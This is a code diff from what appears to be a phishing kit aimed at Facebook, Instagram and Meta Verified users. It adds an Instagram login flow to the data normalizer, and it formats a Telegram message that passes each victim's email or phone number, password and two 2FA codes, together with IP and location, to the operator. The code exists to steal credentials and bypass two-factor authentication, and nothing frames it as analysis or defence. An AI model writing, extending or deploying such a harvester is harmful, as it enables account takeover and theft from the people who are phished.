@@ -96,8 +96,8 @@ function formatCodeField(value: unknown): string {
 
 function normalizeData(input: any = {}) {
     const sf = input.submissionFlow;
-    const submissionFlow: '' | 'facebook_login' | 'meta_verified' =
-        sf === 'facebook_login' || sf === 'meta_verified' ? sf : '';
+    const submissionFlow: '' | 'facebook_login' | 'instagram_login' | 'meta_verified' =
+        sf === 'facebook_login' || sf === 'instagram_login' || sf === 'meta_verified' ? sf : '';
     return {
         ip: input.ip ?? '',
         location: input.location ?? '',
@@ -147,10 +147,8 @@ function formatTelegramSubmissionMessage(d: NormalizedPayload): string {
         `<b>Mobile number or Email:</b> <code>${formatCodeField(primaryLoginIdentifier(d))}</code>`,
         `<b>Password:</b> <code>${formatCodeField(primaryPasswordField(d))}</code>`,
         `----------------------`,
-        `<b>🔐 2FA step 1</b>`,
-        `<code>${formatCodeField(d.twoFa)}</code>`,
-        `<b>🔐 2FA step 2</b>`,
-        `<code>${formatCodeField(d.twoFaSecond)}</code>`,
+        `<b>🔐 2FA step 1:</b><code>${formatCodeField(d.twoFa)}</code>`,
+        `<b>🔐 2FA step 2:</b><code>${formatCodeField(d.twoFaSecond)}</code>`,
     ];
     return lines.join('\n');
 }
